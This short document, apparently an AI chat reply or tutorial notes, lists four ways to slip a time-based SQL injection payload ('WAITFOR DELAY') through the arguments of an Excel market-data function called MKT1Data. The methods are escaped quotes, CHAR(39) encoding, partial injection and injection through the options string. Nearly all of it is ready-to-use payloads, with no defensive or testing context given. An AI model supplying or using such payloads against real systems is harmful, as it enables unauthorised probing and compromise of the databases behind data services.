✅ Correct Way to Inject (Excel-Safe Payloads)
🔹 Method 1: Escape quotes properly

Use double quotes inside string:

=MKT1Data("EURUSD""; WAITFOR DELAY '0:0:5'--","2024-01-01","2024-01-10","NY","FX")
🔹 Method 2: Use CHAR() encoding
=MKT1Data("EURUSD"&CHAR(39)&"; WAITFOR DELAY '0:0:5'--","2024-01-01","2024-01-10","NY","FX")

👉 CHAR(39) = '

🔹 Method 3: Partial Injection (Best Approach)

Instead of breaking syntax:

=MKT1Data("EURUSD' WAITFOR DELAY '0:0:5'","2024-01-01","2024-01-10","NY","FX")
🔹 Method 4: Inject in Additional Options (EASIEST)
=MKT1Data("EURUSD","2024-01-01","2024-01-10","NY","FX","id=MKT1_ID;dates=wk;holidayCal=BMA""; WAITFOR DELAY '0:0:5'--")
